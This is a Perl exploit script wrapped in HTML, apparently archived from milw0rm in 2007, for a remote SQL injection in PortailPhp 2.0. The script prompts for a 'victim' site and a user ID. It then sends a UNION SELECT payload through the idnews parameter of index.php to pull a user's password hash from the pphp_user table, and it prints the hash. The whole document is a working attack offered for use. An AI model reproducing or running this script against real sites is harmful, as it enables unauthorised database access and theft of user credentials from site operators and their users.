<html><head><title>PortailPhp 2.0 (idnews) Remote SQL Injection Exploit</title></head><pre>use LWP::Simple;
print &quot;
Exploit Coded (c) by xoron
Portail PHP v20 (index.php) Remote SQL Injection Exploit
Languages: Turkish, English
Plz Select Language:&quot;;
$dil = &lt;stdin&gt;;
%eng = (
&quot;site&quot; =&gt; &quot;Enter The Victim Without http://:&quot;,
&quot;path&quot; =&gt; &quot;Plz Select Path:&quot;,
&quot;id&quot; =&gt; &quot;Plz Select User ID:&quot;
);
%turk = (
&quot;site&quot; =&gt; &quot;Site Adi http:// ile baslayan:&quot;,
&quot;path&quot; =&gt; &quot;Dizin:&quot;,
&quot;id&quot; =&gt; &quot;ID: &quot;
);
if($dil=~/^turkish$/i){
%dil = %turk;
}
elsif($dil=~/^english$/i){
%dil = %eng;
}
else{print &quot;Undefined Language&quot;; exit}
print $dil{site};
chop($site=&lt;stdin&gt;);
$site = &quot;http://$site&quot; if !($site=~/^http/);
print $dil{path};
chop($dir=&lt;stdin&gt;);
$dir = &quot;/portailphp/&quot; if !$dir;
print $dil{id};
chop($id =&lt;stdin&gt;);
$id = 2 if !$id;
print &quot;Connecting to $site\n&quot;;
$sql = &quot;index.php?affiche=Comment&amp;act=lire&amp;idnews=-1/**/union/**/select/**/0,&quot;;
$sql .= &quot;1,2,US_pwd,4,5,6,7,8,9,10/**/from/**/pphp_user/**/where/**/US_uid=$id/*&quot;;
$get = get(&quot;$site$dir$sql&quot;);
if($get){
if($get=~/&lt;td&gt;&lt;strong&gt;\&amp;nbsp\;\&amp;nbsp\;(.*?)&lt;\/strong&gt;/){
print &quot;You are very Lucky Boy\nI Got Hash 4 ya\nID: $id\nHash: $1&quot;;
exit
}
elsif($get=~/&lt;td&gt;&lt;strong&gt;(.*?)&lt;\/strong&gt;/){
print &quot;Yep I got hash 4 ya\nID: $id\nHash: $1\n&quot;;
exit;
}
else{print &quot;Exploit Failed\n&quot;;exit}
}
print &quot;Connect Failed to $site\n&quot;;
exit;

# milw0rm.com [2007-03-22]</pre></html>